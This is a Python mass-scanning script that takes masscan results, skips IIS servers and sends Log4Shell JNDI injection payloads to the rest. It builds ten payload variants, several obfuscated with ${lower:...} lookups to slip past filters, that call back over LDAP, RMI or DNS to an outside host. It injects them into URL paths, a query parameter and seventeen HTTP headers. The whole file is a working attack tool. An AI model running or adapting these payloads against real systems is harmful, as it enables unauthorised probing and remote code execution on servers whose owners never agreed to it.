#!/bin/python3 

import requests as req
import sys
import random 
from tqdm import tqdm
import warnings
warnings.filterwarnings("ignore")

filename = sys.argv[1]

## ADD the host which you want the call back to be to, essentially any webserver will work or you can use a dns lookup logger like dnslog.cn or others
host = "TO ADD"

p1 = "${jndi:ldap://" + host + "/" + str(random.randint(1,9)) +"}"
p2 = "${jndi:ldap://" + host + "/ " + str(random.randint(1,9)) +"}"
p3 = "${jndi:${lower:l}${lower:d}a${lower:p}://" + host + "/" + str(random.randint(1,9)) +"}"
p4 = "${jndi:rmi://" + host + "}"
p5 = "${${lower:${lower:jndi}}:${lower:rmi}://" + host + "/" + str(random.randint(1,9)) +"}"
p6 = "${${lower:${lower:jndi}}:${lower:rmi}://" + host + "/ " + str(random.randint(1,9)) +"}"
p7 = "${${lower:jndi}:${lower:rmi}://" + host + "/" + str(random.randint(1,9)) +"}"
p8 = "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://" + host + "/" + str(random.randint(1,9)) +"}"
p9 = "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://" + host + "/" + str(random.randint(1,9)) +"}"
p10 = "${jndi:dns://" + host + "/" + str(random.randint(1,9)) +"}"

poclst = [p1, p2, p3, p4, p5, p6, p7, p8, p9, p10]
headerVals = ["User-Agent", "Referer", "X-Client-IP", "X-Remote-IP", "X-Remote-Addr", "X-Forwarded-For", "X-Originating-IP", "Originating-IP", "CF-Connecting_IP",
"True-Client-IP", "X-Forwarded-For","Originating-IP", "X-Real-IP", "Forwarded", "X-Api-Version", "X-Wap-Profile", "Contact"]

def get_masscan_iis(filename):
    ms_urls = []
    # regex may actually be cleaner
    f = open(filename, 'r')
    ips = f.readlines()
    for ip in ips:
        if "Discovered open port" in ip:
            seg = ip.split(" ")
            port = seg[3].split("/")[0]
            host = seg[5]
            if port == "443": host = "https://" + host + "/"
            elif port == "80": host = "http://" + host + "/"
            else: 
                print("Only 443 and 80 supported currently")
                continue
            ms_urls.append(host)
    return ms_urls

# can add more rules for specifically vulnrable vs not if required
def get_n_test(urls):
    IIS = []
    non_IIS = []
    for url in tqdm(urls):
        try:
            r = req.get(url, verify=False, timeout=5)
            if ('Server' in (r.headers).keys()): 
                if ('IIS' in r.headers['Server']): IIS.append(url)
            else: non_IIS.append(url)
        except:
            continue
    return IIS, non_IIS

def scan(url):
    if url[-1] != "/": url+"/"
    for z in range(0, len(poclst)):
        try:
            r = req.get(url + poclst[z], verify=False, timeout=5)
            r = req.get(url + "?heysocdwitsjusttesting?="+ poclst[z], verify=False, timeout=5)
        except:
            continue
    for x in range(0, len(headerVals)):
        for y in range(0, len(poclst)):
            headers = {headerVals[x]:poclst[y]}
            try:
                r = req.get(url, headers=headers, verify=False, timeout=5)
            except:
                continue


urls = get_masscan_iis(filename)
print("Determining if IIS vs non-IIS...")
i, n = get_n_test(urls)
print("Pounding log4j...")
for scan_ip in tqdm(n):
    scan(scan_ip)

